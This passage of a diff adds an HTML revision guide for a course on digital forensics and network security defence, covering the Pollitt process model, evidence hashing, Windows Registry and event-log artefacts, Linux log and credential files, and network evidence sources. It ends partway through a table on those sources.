@@ -1,0 +1,2100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Week 10 Revision — Digital Forensics &amp; Network Security Defence</title>
+<style>
+  :root{
+    --bg:#090a12;
+    --panel:#12131e;
+    --panel2:#191b2a;
+    --border:#272a3d;
+    --text:#d7dbe8;
+    --muted:#8890a8;
+    --accent:#a78bfa;      /* forensics purple */
+    --accent2:#22d3ee;     /* cyan */
+    --green:#34d399;       /* defence green */
+    --red:#f87171;
+    --amber:#fbbf24;
+    --pink:#f472b6;
+    --blue:#60a5fa;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:
+      radial-gradient(1200px 620px at 88% -8%, #1e1636 0%, transparent 60%),
+      radial-gradient(900px 520px at -5% 22%, #0d2229 0%, transparent 55%),
+      var(--bg);
+    color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    font-size:15.5px;line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  code,pre,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;}
+
+  /* ---------- top bar ---------- */
+  .topbar{
+    padding:34px 40px 26px;border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg, rgba(167,139,250,.09), transparent);
+  }
+  .topbar h1{
+    margin:0 0 6px;font-size:clamp(1.35rem,2.5vw,1.95rem);letter-spacing:-.5px;
+    background:linear-gradient(90deg,#c4b5fd,#a78bfa 35%,#22d3ee 70%,#34d399);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .topbar p{margin:0;color:var(--muted);font-size:.92rem;}
+
+  /* ---------- layout ---------- */
+  .layout{display:flex;align-items:flex-start;}
+  .sidebar{
+    position:sticky;top:0;height:100vh;width:272px;flex:0 0 272px;
+    overflow-y:auto;padding:22px 14px 60px;
+    border-right:1px solid var(--border);
+    background:rgba(7,8,14,.75);backdrop-filter:blur(6px);
+  }
+  .sidebar h3{font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;
+    color:var(--muted);margin:0 0 10px 10px;font-weight:600;}
+  .sidebar .grp{margin-bottom:18px;}
+  .sidebar a{
+    display:block;padding:6px 12px;border-radius:8px;color:var(--muted);
+    text-decoration:none;font-size:.855rem;border-left:2px solid transparent;transition:.15s;
+  }
+  .sidebar a:hover{background:var(--panel2);color:var(--text);}
+  .sidebar a.active{background:rgba(167,139,250,.13);color:#d3c6ff;border-left-color:var(--accent);}
+  .sidebar a.d-active{background:rgba(52,211,153,.1);color:#9ff0cd;border-left-color:var(--green);}
+
+  main{flex:1 1 auto;min-width:0;padding:36px 44px 160px;max-width:1090px;}
+
+  /* ---------- sections ---------- */
+  section{margin-bottom:64px;scroll-margin-top:24px;}
+  section > h2{
+    font-size:1.38rem;margin:0 0 6px;letter-spacing:-.3px;
+    padding-left:14px;border-left:4px solid var(--accent);
+  }
+  section.dsec > h2{border-left-color:var(--green);}
+  section > .lede{color:var(--muted);margin:0 0 22px 14px;font-size:.93rem;}
+  h3{font-size:1.05rem;margin:30px 0 10px;color:#c3c8dd;}
+  h4{font-size:.94rem;margin:18px 0 6px;color:#a9b2cc;}
+  p{margin:10px 0;}
+  ul,ol{margin:10px 0;padding-left:22px;}
+  li{margin:5px 0;}
+  strong{color:#fff;font-weight:600;}
+  em{color:#b3c0dc;font-style:normal;}
+
+  /* ---------- cards ---------- */
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    padding:18px 20px;margin:16px 0;}
+  .card.accent{border-left:3px solid var(--accent);}
+  .card.def{border-left:3px solid var(--green);}
+  .card.warn{border-left:3px solid var(--amber);background:rgba(251,191,36,.055);}
+  .card.danger{border-left:3px solid var(--red);background:rgba(248,113,113,.055);}
+  .card.good{border-left:3px solid var(--green);background:rgba(52,211,153,.05);}
+  .card.info{border-left:3px solid var(--accent2);background:rgba(34,211,238,.05);}
+  .card h4{margin-top:0;}
+
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+  .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+  .grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;}
+  @media(max-width:880px){.grid2,.grid3,.grid4{grid-template-columns:1fr;}}
+
+  /* ---------- tables ---------- */
+  .tblwrap{overflow-x:auto;margin:16px 0;border:1px solid var(--border);border-radius:10px;}
+  table{border-collapse:collapse;width:100%;font-size:.865rem;min-width:520px;}
+  th,td{padding:10px 13px;text-align:left;border-bottom:1px solid var(--border);vertical-align:top;}
+  th{background:var(--panel2);color:#c3c8dd;font-weight:600;font-size:.76rem;
+     letter-spacing:.05em;text-transform:uppercase;}
+  tr:last-child td{border-bottom:none;}
+  td code{background:#0a0c14;padding:1px 5px;border-radius:4px;font-size:.81rem;color:#c4b5fd;}
+
+  /* ---------- code ---------- */
+  pre.code{
+    background:#080910;border:1px solid var(--border);border-radius:10px;
+    padding:14px 16px;overflow-x:auto;font-size:.82rem;line-height:1.6;
+    margin:14px 0;color:#cbd3e4;
+  }
+  .cm{color:#5e6680;}
+  code.inl{background:#080910;border:1px solid var(--border);padding:1px 6px;
+    border-radius:5px;font-size:.83rem;color:#c4b5fd;}
+  .hl-green{background:rgba(52,211,153,.16);color:#9ff0cd;padding:0 4px;border-radius:4px;}
+  .hl-red{background:rgba(248,113,113,.16);color:#ffb3b3;padding:0 4px;border-radius:4px;}
+  .hl-amber{background:rgba(251,191,36,.15);color:#ffd98a;padding:0 4px;border-radius:4px;}
+  .hl-cyan{background:rgba(34,211,238,.14);color:#9ceaf7;padding:0 4px;border-radius:4px;}
+
+  /* ---------- buttons ---------- */
+  .chip{background:var(--panel2);border:1px solid var(--border);color:var(--muted);
+    padding:6px 12px;border-radius:999px;font-size:.785rem;cursor:pointer;
+    transition:.15s;font-family:inherit;margin:0;}
+  .chip:hover{color:var(--text);border-color:#3b4058;}
+  .chip.active{background:rgba(167,139,250,.17);border-color:var(--accent);color:#d3c6ff;}
+  .chip.g.active{background:rgba(52,211,153,.15);border-color:var(--green);color:#9ff0cd;}
+  .btn{background:linear-gradient(180deg,#1e2033,#151722);
+    border:1px solid #343a54;color:#cdd4e6;padding:8px 16px;border-radius:8px;
+    cursor:pointer;font-size:.84rem;font-family:inherit;transition:.15s;}
+  .btn:hover{border-color:var(--accent);color:#fff;}
+  .btn.primary{background:linear-gradient(180deg,#6d4fd4,#4c37a0);border-color:#8b6ff0;color:#f0eaff;}
+  .btn.primary:hover{background:linear-gradient(180deg,#7f60e8,#5a43b8);}
+  .btn.green{background:linear-gradient(180deg,#0f6b52,#0a4a39);border-color:#1a9c78;color:#d4fff0;}
+  .btn.green:hover{background:linear-gradient(180deg,#138066,#0c5845);}
+  .btn.danger{background:linear-gradient(180deg,#7a2a2a,#4d1a1a);border-color:#a33a3a;color:#ffd6d6;}
+  .btn.danger:hover{background:linear-gradient(180deg,#943232,#5e2020);}
+  .btnrow{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0;align-items:center;}
+
+  /* ---------- generic diagram ---------- */
+  .diagram{
+    position:relative;background:#07080e;border:1px solid var(--border);
+    border-radius:12px;padding:18px;margin:16px 0;overflow:hidden;
+  }
+  .node{
+    background:var(--panel2);border:1px solid #343a54;border-radius:10px;
+    padding:10px 12px;font-size:.78rem;text-align:center;transition:.35s;
+    position:relative;z-index:2;
+  }
+  .node b{display:block;font-size:.83rem;color:#e3e8f5;margin-bottom:2px;}
+  .node span{color:var(--muted);font-size:.72rem;}
+  .node.purple{border-color:#6d4fd4;background:#1a1430;}
+  .node.cyan{border-color:#1a8a9c;background:#0c2229;}
+  .node.green{border-color:#1a9c78;background:#0c231c;}
+  .node.red{border-color:#a33a3a;background:#2a1212;}
+  .node.amber{border-color:#a3703a;background:#261e10;}
+  .node.blue{border-color:#2f6ea3;background:#0f1f2e;}
+  .node.glow{box-shadow:0 0 0 2px currentColor,0 0 22px rgba(167,139,250,.35);}
+  .pkt{
+    position:absolute;width:10px;height:10px;border-radius:50%;
+    background:var(--accent);box-shadow:0 0 10px var(--accent);
+    transform:translate(-50%,-50%);z-index:3;pointer-events:none;
+  }
+  .pkt.g{background:var(--green);box-shadow:0 0 10px var(--green);}
+  .pkt.r{background:var(--red);box-shadow:0 0 10px var(--red);}
+  .pkt.a{background:var(--amber);box-shadow:0 0 10px var(--amber);}
+  .pkt.c{background:var(--accent2);box-shadow:0 0 10px var(--accent2);}
+
+  /* ---------- Pollitt stepper ---------- */
+  .stepper{display:flex;gap:8px;flex-wrap:wrap;margin:16px 0;}
+  .step{
+    flex:1;min-width:150px;background:#0c0e18;border:1px solid var(--border);
+    border-radius:10px;padding:12px 14px;cursor:pointer;transition:.2s;position:relative;
+  }
+  .step:hover{border-color:#3b4058;}
+  .step.active{background:rgba(167,139,250,.1);border-color:var(--accent);}
+  .step .n{
+    display:inline-flex;align-items:center;justify-content:center;
+    width:24px;height:24px;border-radius:50%;background:#1e2130;color:var(--muted);
+    font-size:.74rem;font-weight:700;margin-bottom:6px;transition:.2s;
+  }
+  .step.active .n{background:var(--accent);color:#1a1030;}
+  .step b{display:block;font-size:.87rem;color:#e3e8f5;margin-bottom:3px;}
+  .step span{font-size:.76rem;color:var(--muted);line-height:1.4;display:block;}
+  .step-note{
+    background:#0b0d16;border:1px solid var(--border);border-radius:9px;
+    padding:12px 14px;font-size:.86rem;color:#b3c0dc;min-height:62px;
+  }
+
+  /* ---------- hash demo ---------- */
+  .hash-input{
+    width:100%;background:#07080e;border:1px solid #343a54;border-radius:8px;
+    padding:11px 13px;color:#cbd3e4;font-family:ui-monospace,Menlo,monospace;
+    font-size:.83rem;resize:vertical;min-height:70px;outline:none;transition:.15s;
+  }
+  .hash-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(167,139,250,.13);}
+  .hash-row{
+    display:grid;grid-template-columns:80px 1fr;gap:10px;align-items:center;
+    background:#07080e;border:1px solid var(--border);border-radius:7px;
+    padding:8px 12px;margin:6px 0;font-family:ui-monospace,Menlo,monospace;font-size:.76rem;
+    overflow-x:auto;
+  }
+  .hash-row .algo{color:#c4b5fd;font-weight:700;}
+  .hash-row .val{color:#8fa0bd;word-break:break-all;}
+  .hash-row.changed{border-color:var(--red);background:rgba(248,113,113,.07);}
+  .hash-row.changed .val{color:#ffb3b3;}
+  .verdict{
+    margin-top:12px;padding:11px 14px;border-radius:9px;font-size:.85rem;
+    background:#0b0d16;border:1px solid var(--border);
+  }
+
+  /* ---------- registry explorer ---------- */
+  .reg-tree{background:#07080e;border:1px solid var(--border);border-radius:10px;
+    padding:12px;font-family:ui-monospace,Menlo,monospace;font-size:.79rem;line-height:1.9;}
+  .reg-node{
+    cursor:pointer;padding:2px 8px;border-radius:5px;transition:.13s;display:inline-block;
+  }
+  .reg-node:hover{background:#161a28;}
+  .reg-node.active{background:rgba(167,139,250,.2);color:#d3c6ff;}
+  .reg-hive{color:#c4b5fd;font-weight:700;}
+  .reg-key{color:#8fa0bd;}
+  .reg-indent{padding-left:22px;}
+  .reg-info{
+    background:#0b0d16;border:1px solid var(--border);border-radius:10px;
+    padding:14px 16px;font-size:.86rem;color:#b3c0dc;min-height:80px;margin-top:14px;
+  }
+
+  /* ---------- linux file viewer ---------- */
+  .filetab{background:#07080e;border:1px solid var(--border);border-radius:10px;
+    padding:0;overflow:hidden;margin:14px 0;}
+  .filetab-head{background:var(--panel2);padding:9px 14px;font-size:.78rem;
+    color:#c4b5fd;font-family:ui-monospace,monospace;border-bottom:1px solid var(--border);}
+  .filetab-body{padding:13px 16px;font-family:ui-monospace,Menlo,monospace;
+    font-size:.78rem;line-height:1.9;overflow-x:auto;white-space:pre;}
+  .filetab-body .fld{color:#c4b5fd;}
+  .filetab-body .fld2{color:#9ceaf7;}
+  .filetab-body .fld3{color:#9ff0cd;}
+  .filetab-body .com{color:#5e6680;}
+
+  /* ---------- log analyser ---------- */
+  .log-list{background:#07080e;border:1px solid var(--border);border-radius:10px;
+    overflow:hidden;margin:12px 0;}
+  .log-row{
+    display:grid;grid-template-columns:1fr auto;gap:10px;padding:9px 13px;
+    font-family:ui-monospace,Menlo,monospace;font-size:.76rem;
+    border-bottom:1px solid #13161f;cursor:pointer;transition:.15s;
+  }
+  .log-row:last-child{border-bottom:none;}
+  .log-row:hover{background:#0f121c;}
+  .log-row.sel{background:rgba(167,139,250,.11);border-left:3px solid var(--accent);}
+  .log-row .req{color:#8fa0bd;overflow-x:auto;white-space:nowrap;}
+  .log-row .tag{font-size:.68rem;padding:1px 8px;border-radius:999px;
+    background:#1e2130;color:var(--muted);white-space:nowrap;}
+  .log-detail{
+    background:#0b0d16;border:1px solid var(--border);border-radius:10px;
+    padding:14px 16px;font-size:.86rem;color:#b3c0dc;min-height:80px;
+  }
+
+  /* ---------- defense-in-depth ---------- */
+  .did-wrap{display:flex;gap:26px;align-items:center;flex-wrap:wrap;margin:14px 0;}
+  .did-svg{width:360px;height:360px;flex:0 0 auto;}
+  .did-ring{transition:.25s;cursor:pointer;}
+  .did-ring:hover{opacity:.85;}
+  .did-ring.dim{opacity:.25;}
+  .did-legend{flex:1;min-width:240px;}
+  .did-item{
+    display:flex;gap:11px;padding:8px 11px;border-radius:8px;margin:5px 0;
+    cursor:pointer;transition:.15s;border:1px solid transparent;align-items:flex-start;
+  }
+  .did-item:hover{background:#10131f;}
+  .did-item.active{background:rgba(52,211,153,.1);border-color:var(--green);}
+  .did-num{
+    flex:0 0 22px;height:22px;border-radius:50%;background:#1e2130;color:var(--muted);
+    display:flex;align-items:center;justify-content:center;font-size:.72rem;font-weight:700;
+    transition:.2s;
+  }
+  .did-item.active .did-num{background:var(--green);color:#062a1e;}
+  .did-item .txt b{display:block;font-size:.86rem;color:#e3e8f5;margin-bottom:1px;}
+  .did-item .txt span{font-size:.76rem;color:var(--muted);}
+
+  /* ---------- terminal ---------- */
+  .terminal{
+    background:#06070c;border:1px solid var(--border);border-radius:9px;
+    padding:14px 16px;font-family:ui-monospace,Menlo,monospace;font-size:.79rem;
+    color:#cbd3e4;line-height:1.7;margin:12px 0;overflow-x:auto;min-height:100px;
+    white-space:pre-wrap;word-break:break-word;
+  }
+  .terminal .prompt{color:var(--green);}
+  .terminal .ok{color:#34d399;}
+  .terminal .warn{color:#fbbf24;}
+  .terminal .bad{color:#f87171;}
+  .terminal .dim{color:#5e6680;}
+  .terminal .pur{color:#c4b5fd;}
+  .terminal .cy{color:#22d3ee;}
+
+  /* ---------- firewall rule tester ---------- */
+  .rule-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:14px 0;}
+  @media(max-width:760px){.rule-grid{grid-template-columns:1fr;}}
+  .rule-box{background:#07080e;border:1px solid var(--border);border-radius:10px;padding:13px;}
+  .rule-box h5{margin:0 0 9px;font-size:.74rem;letter-spacing:.07em;
+    text-transform:uppercase;color:var(--muted);font-weight:600;}
+  .rule-line{font-family:ui-monospace,Menlo,monospace;font-size:.75rem;
+    padding:5px 9px;border-radius:5px;margin:3px 0;background:#0d1018;color:#8fa0bd;}
+  .rule-line .allow{color:#34d399;}
+  .rule-line .deny{color:#f87171;}
+  .field-row{display:flex;gap:10px;flex-wrap:wrap;margin:12px 0;align-items:center;}
+  .field-row label{font-size:.8rem;color:var(--muted);}
+  .field-row input[type=number]{
+    width:110px;background:#07080e;border:1px solid #343a54;border-radius:7px;
+    padding:7px 10px;color:#cbd3e4;font-family:ui-monospace,monospace;font-size:.82rem;
+    outline:none;
+  }
+  .field-row input[type=number]:focus{border-color:var(--accent);}
+  .verdict-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px;}
+  .verdict-pill{
+    flex:1;min-width:200px;border-radius:9px;padding:11px 14px;
+    font-size:.82rem;border:1px solid;transition:.25s;
+  }
+  .verdict-pill.ok{border-color:#1a9c78;background:rgba(52,211,153,.1);color:#9ff0cd;}
+  .verdict-pill.bad{border-color:#a33a3a;background:rgba(248,113,113,.1);color:#ffb3b3;}
+  .verdict-pill b{display:block;font-size:.86rem;margin-bottom:2px;}
+
+  /* ---------- stateful/stateless ---------- */
+  .fw-state{
+    background:#07080e;border:1px solid var(--border);border-radius:10px;
+    padding:12px 14px;font-family:ui-monospace,Menlo,monospace;font-size:.77rem;
+    line-height:1.9;min-height:130px;white-space:pre-wrap;overflow-x:auto;
+  }
+
+  /* ---------- MAC flooding ---------- */
+  .mac-table{background:#07080e;border:1px solid var(--border);border-radius:10px;
+    padding:10px;margin:12px 0;font-family:ui-monospace,Menlo,monospace;font-size:.75rem;}
+  .mac-slot{
+    display:grid;grid-template-columns:60px 1fr 1fr;gap:10px;
+    padding:5px 9px;border-radius:5px;margin:2px 0;background:#0d1018;
+    color:#6e7a90;transition:.2s;
+  }
+  .mac-slot.filled{background:#1a1430;color:#c4b5fd;}
+  .mac-slot.evil{background:#2a1212;color:#ffb3b3;}
+
+  /* ---------- AAA pillars ---------- */
+  .aaa-wrap{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:14px 0;}
+  @media(max-width:760px){.aaa-wrap{grid-template-columns:1fr;}}
+  .aaa-card{
+    background:#0c0e18;border:1px solid var(--border);border-radius:11px;
+    padding:16px;cursor:pointer;transition:.2s;text-align:center;
+  }
+  .aaa-card:hover{border-color:#3b4058;}
+  .aaa-card.active{border-color:var(--accent);background:rgba(167,139,250,.1);}
+  .aaa-card .icon{
+    font-size:1.5rem;margin-bottom:6px;display:block;
+  }
+  .aaa-card b{display:block;font-size:.92rem;color:#e3e8f5;margin-bottom:4px;}
+  .aaa-card span{font-size:.77rem;color:var(--muted);}
+
+  /* ---------- quiz ---------- */
+  .quiz-item{background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    padding:16px 18px;margin:14px 0;}
+  .quiz-item .q{font-weight:600;margin-bottom:10px;color:#e8edf9;}
+  .opt{
+    display:block;width:100%;text-align:left;background:#0c0e18;border:1px solid #272a3d;
+    color:#b3c0dc;padding:9px 13px;border-radius:8px;margin:6px 0;cursor:pointer;
+    font-family:inherit;font-size:.855rem;transition:.15s;
+  }
+  .opt:hover{border-color:#3b4058;background:#10131f;}
+  .opt.correct{background:rgba(52,211,153,.14);border-color:var(--green);color:#b7f5dd;}
+  .opt.wrong{background:rgba(248,113,113,.12);border-color:var(--red);color:#ffb3b3;}
+  .explain{display:none;margin-top:10px;padding:10px 13px;border-radius:8px;
+    background:#0b0d16;border-left:3px solid var(--accent);font-size:.84rem;color:#b3c0dc;}
+  .explain.show{display:block;}
+  .score{font-size:.9rem;color:var(--muted);margin-top:10px;}
+
+  /* ---------- misc ---------- */
+  .pill{display:inline-block;padding:2px 9px;border-radius:999px;font-size:.7rem;
+    font-weight:600;letter-spacing:.04em;text-transform:uppercase;margin-right:6px;}
+  .pill.purple{background:rgba(167,139,250,.15);color:#d3c6ff;border:1px solid #5f4a8a;}
+  .pill.green{background:rgba(52,211,153,.13);color:#9ff0cd;border:1px solid #1a7a5f;}
+  .pill.red{background:rgba(248,113,113,.14);color:#ffb3b3;border:1px solid #7a3d3d;}
+  .pill.amber{background:rgba(251,191,36,.13);color:#ffd98a;border:1px solid #7a5c2f;}
+  .pill.cyan{background:rgba(34,211,238,.13);color:#9ceaf7;border:1px solid #1a7a8a;}
+
+  @media(max-width:900px){
+    .layout{display:block;}
+    .sidebar{position:static;height:auto;width:auto;flex:none;border-right:none;
+      border-bottom:1px solid var(--border);padding-bottom:18px;}
+    main{padding:26px 20px 100px;}
+    .topbar{padding:24px 20px 18px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <h1>Week 10 — Digital Forensics &amp; Network Security Defence</h1>
+  <p>Interactive revision guide · 9 topic areas · evidence integrity, OS artefacts, log analysis, layered defence &amp; self-test</p>
+</div>
+
+<div class="layout">
+  <nav class="sidebar" id="sidebar">
+    <div class="grp">
+      <h3>Part 1 · Digital Forensics</h3>
+      <a href="#s1">1 · Fundamentals &amp; Process</a>
+      <a href="#s2">2 · OS Forensics &amp; Artefacts</a>
+      <a href="#s3">3 · Network Forensics &amp; Logs</a>
+    </div>
+    <div class="grp">
+      <h3>Part 2 · Network Security Defence</h3>
+      <a href="#s4">4 · Defense-in-Depth</a>
+      <a href="#s5">5 · Firewalls &amp; Filtering</a>
+      <a href="#s6">6 · IDS &amp; IPS</a>
+      <a href="#s7">7 · Proxies &amp; VPNs</a>
+      <a href="#s8">8 · Port Security &amp; AAA</a>
+    </div>
+    <div class="grp">
+      <h3>Wrap-up</h3>
+      <a href="#s9">9 · Summary &amp; Quiz</a>
+    </div>
+  </nav>
+
+  <main>
+
+  <!-- ============================ 1 ============================ -->
+  <section id="s1">
+    <h2>1 · Digital Forensics — Fundamentals &amp; Process Models</h2>
+    <p class="lede">Forensics is science applied to legal problems. Digital forensics is that science aimed at evidence stored or transmitted on digital devices.</p>
+
+    <div class="grid2">
+      <div class="card accent">
+        <h4>Definitions</h4>
+        <p><strong>Forensics</strong> — the application of science to legal problems and investigations.</p>
+        <p style="margin-bottom:0"><strong>Digital Forensics</strong> — the branch of forensics involving the recovery and investigation of digital evidence stored or transmitted using digital devices.</p>
+      </div>
+      <div class="card">
+        <h4>Forensic domains</h4>
+        <ul style="margin-bottom:0">
+          <li>Computer forensics</li>
+          <li>Storage forensics</li>
+          <li>Network forensics</li>
+          <li>Mobile forensics</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="card">
+      <h4>Categories of digital evidence</h4>
+      <p style="margin-bottom:0">Emails · credit card transactions · accounting files · notes · images · internet browsing history · IP addresses · system logs · malware payloads.</p>
+    </div>
+
+    <h3>1.1 The Pollitt process model</h3>
+    <p>There is <strong>no single universal process model</strong>, but structured frameworks govern investigations. Mark M. Pollitt's model is a law-based framework — click each stage.</p>
+
+    <div class="stepper" id="pollitt-steps"></div>
+    <div class="step-note" id="pollitt-note"></div>
+
+    <h3>1.2 Evidence integrity — chain of custody &amp; cryptographic hashing</h3>
+    <div class="card accent">
+      <h4>Chain of custody</h4>
+      <p style="margin-bottom:0">Demonstrating that the evidence analysed and presented in court is <strong>identical to what was collected at the scene</strong> without tampering. Cryptographic hashing is how that claim is proven: a unique checksum is generated on acquisition and re-computed later. Any collision or alteration invalidates evidence integrity.</p>
+    </div>
+
+    <p class="mono" style="font-size:.82rem;color:#8890a8;text-align:center;letter-spacing:.02em;">
+      MD5 <span style="color:#5e6680">(legacy)</span> &nbsp;→&nbsp; SHA-1 &nbsp;→&nbsp; SHA-2 (SHA-256)
+    </p>
+
+    <h4>Live demo — edit the evidence and watch the hashes break</h4>
+    <div class="card">
+      <label for="hash-input" style="font-size:.8rem;color:#8890a8;">Acquired evidence (drive image metadata):</label>
+      <textarea class="hash-input" id="hash-input" spellcheck="false">CASE-2024-0117 | suspect laptop disk image | sector 0x1A3F | acquired 2024-03-11T09:14Z | investigator: J. Doe</textarea>
+      <div class="btnrow">
+        <button class="btn danger" id="hash-tamper">Tamper with one byte</button>
+        <button class="btn" id="hash-reset">↺ Restore original</button>
+      </div>
+      <div id="hash-rows"></div>
+      <div class="verdict" id="hash-verdict"></div>
+    </div>
+
+    <div class="card warn">
+      <h4>Why this matters in court</h4>
+      <p style="margin-bottom:0">If the SHA-256 of the acquired image and the SHA-256 of the analysed copy disagree, the defence can argue the evidence was altered in custody — and it becomes inadmissible. Hashing is not administrative paperwork; it is the evidentiary foundation.</p>
+    </div>
+  </section>
+
+  <!-- ============================ 2 ============================ -->
+  <section id="s2">
+    <h2>2 · OS Forensics &amp; Evidentiary Artefacts</h2>
+    <p class="lede">The operating system supervises every state change triggered by a user — human or bot. Those state changes leave artefacts.</p>
+
+    <div class="card accent">
+      <h4>What the OS records</h4>
+      <p style="margin-bottom:0">File downloads · program executions · file creation / modification / deletion · physical device connections · USB storage attachments · user account activity · network usage.</p>
+    </div>
+
+    <h3>2.1 Volatile memory vs persistent storage</h3>
+    <div class="grid2">
+      <div class="card info">
+        <h4>RAM — volatile</h4>
+        <ul style="margin-bottom:0">
+          <li><strong>OS loading</strong> — bootloader code and data</li>
+          <li><strong>OS initialisation</strong> — service processes, shared libraries, kernel in-memory data structures</li>
+          <li><strong>User session(s)</strong> — active application process state and memory buffers</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>ROM / disk — persistent</h4>
+        <p style="margin-bottom:0">Persistent bootloader code, kernel binaries, system configurations, service executables, log files, temporary files, app executables, configuration files, user data files.</p>
+      </div>
+    </div>
+    <p style="font-size:.85rem;color:#8890a8;"><em>Forensic consequence:</em> RAM must be captured first — power loss destroys it forever. Disk survives a reboot.</p>
+
+    <h3>2.2 Windows Registry explorer</h3>
+    <p>The Registry is structured like a unified file system: <strong>Hives</strong> (root directories) → <strong>Keys</strong> (subfolders) → <strong>Values</strong> (files with data types). Click a node to see its forensic value.</p>
+
+    <div class="grid2">
+      <div class="reg-tree" id="reg-tree"></div>
+      <div class="reg-info" id="reg-info"></div>
+    </div>
+
+    <div class="tblwrap" style="margin-top:18px;">
+      <table>
+        <thead><tr><th>Root key (hive)</th><th>Forensic relevance</th></tr></thead>
+        <tbody>
+          <tr><td><code>HKEY_CLASSES_ROOT</code></td><td>File-association mapping — reveals which program opens which extension.</td></tr>
+          <tr><td><code>HKEY_CURRENT_USER</code></td><td>Personal preferences, recent documents, typed URLs, browsing activity.</td></tr>
+          <tr><td><code>HKEY_LOCAL_MACHINE</code></td><td>System configuration, installed services, autostart entries, SAM user accounts.</td></tr>
+          <tr><td><code>HKEY_USERS</code></td><td>All loaded user profiles — useful when the user is not currently logged in.</td></tr>
+          <tr><td><code>HKEY_CURRENT_CONFIG</code></td><td>Current hardware profile.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="card warn">
+      <h4>High-value registry locations</h4>
+      <ul style="margin-bottom:0">
+        <li><code class="inl">SAM\Domains\Account\Users</code> — <strong>last login timestamps</strong> per account.</li>
+        <li><code class="inl">...\CurrentVersion\Run</code> — programs that auto-start at boot (persistence).</li>
+        <li><code class="inl">...\Explorer\RecentDocs</code> / <code class="inl">TypedPaths</code> — recently opened and typed file paths.</li>
+      </ul>
+    </div>
+
+    <h3>2.3 Windows event logs &amp; other artefacts</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Artefact</th><th>Location / detail</th><th>What it proves</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Security event log</strong></td><td><code>%systemroot%\System32\winevt\logs\Security.evtx</code></td><td>Successful/failed logons, password change timestamps.</td></tr>
+          <tr><td><strong>Link files (.lnk)</strong></td><td>Recent-items folders</td><td>Files the user opened, and where they were stored.</td></tr>
+          <tr><td><strong>Recycle Bin</strong></td><td><code>$Recycle.Bin</code></td><td>Deleted files, original path, deletion time.</td></tr>
+          <tr><td><strong>MS Office metadata</strong></td><td>Embedded in the document</td><td>Last 10 authors, track-changes revisions, hidden comments, created / last-written / last-accessed times.</td></tr>
+          <tr><td><strong>Prefetch</strong></td><td><code>C:\Windows\Prefetch\*.pf</code></td><td>Proof a program executed, plus run count and last run time.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>2.4 Linux forensics artefacts</h3>
+    <div class="card accent">
+      <h4>Key characteristics</h4>
+      <ul style="margin-bottom:0">
+        <li><strong>No centralised registry</strong> — system info is scattered across plain-text files.</li>
+        <li>Different file systems — traditionally <em>no file creation timestamps</em> before EXT4.</li>
+        <li>Plain-text data enables <strong>fast string searching</strong> (grep, strings).</li>
+      </ul>
+    </div>
+
+    <div class="btnrow" id="linux-tabs"></div>
+    <div class="filetab" id="linux-view"></div>
+
+    <div class="grid2">
+      <div class="card">
+        <h4>Credential files</h4>
+        <ul style="margin-bottom:0">
+          <li><code class="inl">/etc/passwd</code> — basic account info; <strong>UID 0 = root</strong>.</li>
+          <li><code class="inl">/etc/shadow</code> — encrypted password hashes; cracked offline with tools like <em>John the Ripper</em>.</li>
+          <li><code class="inl">/etc/group</code> — group memberships.</li>
+          <li><code class="inl">/etc/sudoers</code>, <code class="inl">/etc/inittab</code>, <code class="inl">/var/spool/cron/*</code> — privilege and scheduled-task persistence.</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>Log files</h4>
+        <ul style="margin-bottom:0">
+          <li><code class="inl">/var/log/wtmp</code> — login history (user, source IP, login time, session duration), read with the <code class="inl">last</code> command.</li>
+          <li><code class="inl">/var/log/auth.log</code> / <code class="inl">/var/log/secure</code> — authentication attempts.</li>
+          <li><code class="inl">/var/log/boot.log</code>, <code class="inl">/var/log/audit/audit.log</code>.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================ 3 ============================ -->
+  <section id="s3">
+    <h2>3 · Network Forensics, Web Logs &amp; Packet Analysis</h2>
+    <p class="lede">Networks are evidence-rich: DHCP leases, router tables, firewall sessions, and web-server logs all persist independently of the endpoint.</p>
+
+    <h3>3.1 Network-based evidence sources</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Source</th><th>Evidence it provides</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Wireless Access Points</strong></td><td>Eavesdropping on unencrypted management traffic.</td></tr>
+          <tr><td><strong>Switches</strong></td><td>Port-to-MAC address mapping tables, mirrored traffic.</td></tr>
+          <tr><td><strong>Routers</strong></td><td>Port-to-network routing maps, packet filtering rules.</td></tr>
+          <tr><td><strong>DHCP servers</strong></td><td>Lease logs mapping assigned IP addresses to physical MAC addresses.</td></tr>
+          <tr><td><strong>AAA servers</strong></td><td>Centralised logs of successful and failed login attempts.</td></tr>
+          <tr><td><strong>NIDS / NIPS</strong></td><td>Intrusion detection logs and alert triggers.</td></tr>
